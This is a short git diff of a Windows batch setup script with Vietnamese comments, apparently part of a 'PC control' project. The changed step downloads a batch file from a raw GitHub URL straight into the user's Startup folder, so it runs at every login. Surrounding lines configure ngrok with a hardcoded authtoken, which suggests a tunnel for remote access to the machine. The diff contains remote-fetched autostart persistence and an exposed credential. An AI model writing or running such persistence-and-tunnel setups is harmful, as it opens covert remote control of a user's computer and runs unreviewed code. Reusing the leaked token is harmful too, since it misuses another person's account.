@@ -35,9 +35,8 @@ ngrok.exe config add-authtoken 2hlr5hFpZid0dajdFUQvzl6AvL1_4oeHWSyQ78RPdZHRMAY5d
 :: Bước 9: Tải TDMCngrok.bat vào thư mục Startup (shell:startup)
 echo Dang tai TDMCngrok.bat vao Startup...
 
-powershell -Command ^
-  "$startup = [Environment]::GetFolderPath('Startup'); ^
-   Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/Datd6100/Sieu-kiem-soat-pc/refs/heads/main/TDMCngrok.bat' -OutFile ($startup + '\TDMCngrok.bat')"
+curl -o "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\TDMCngrok.bat" ^
+  https://raw.githubusercontent.com/Datd6100/Sieu-kiem-soat-pc/refs/heads/main/TDMCngrok.bat
 
 :: Kiểm tra xem file đã tồn tại chưa
 IF EXIST "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\TDMCngrok.bat" (
